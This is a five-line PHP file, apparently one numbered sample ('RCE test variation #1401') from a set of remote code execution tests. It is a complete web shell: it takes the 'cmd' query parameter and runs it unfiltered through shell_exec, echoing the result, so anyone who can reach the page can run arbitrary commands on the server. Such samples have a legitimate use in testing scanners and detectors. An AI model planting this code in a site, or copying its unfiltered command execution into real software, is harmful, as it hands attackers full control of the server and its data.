<?php
// RCE test variation #1401
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>